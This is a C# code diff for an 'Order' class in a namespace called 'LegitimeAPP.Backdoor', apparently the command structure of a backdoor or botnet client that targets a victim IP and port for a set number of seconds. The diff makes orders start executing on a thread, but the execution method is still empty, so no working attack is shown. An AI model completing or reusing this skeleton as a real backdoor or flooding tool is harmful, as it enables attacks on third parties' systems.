@@ -2,6 +2,7 @@ using System ;
 using System.Collections.Generic ;
 using System.Net ;
 using System.Net.Sockets ;
+using System.Net.NetworkInformation;
 
 using System.Xml;
 using System.Xml.Serialization;
@@ -21,19 +22,32 @@ namespace LegitimeAPP.Backdoor {
         public int Port {get; set;}
 
         [XmlElement("victimIP")]
-        public IPAddress VictimIP {get; set;}
+        public string VictimIP {get; set;}
 
         [XmlElement("nbSecond")]
         public int nbSecond ;
 
+
+/*
+        [XmlElement("Speed")]
+        public int speed ; 
+*/
         [XmlIgnore]
         Thread executingThis ; 
         public Order() {}
 
         public Order(int Port, string VictimIP, int nbSecond) {
             this.Port = Port ;
-            this.VictimIP = IPAddress.Parse(VictimIP) ;
+            this.VictimIP = VictimIP ;
             this.nbSecond = nbSecond ;
+           // this.speed = speed ; 
+
+
+            executingThis = new Thread(Exec) ;
+
+            executingThis.Name = "Executing Order" ;
+
+            executingThis.Start() ;    
         }
 
 
@@ -49,10 +63,10 @@ namespace LegitimeAPP.Backdoor {
 
         // EXECUTION DE L'ORDRE
         private void Exec() {
-            // On execute l'ordre ici 
+            // On execute l'ordre ici
+        
+            
+      
         }
-
-
-
     }
 }
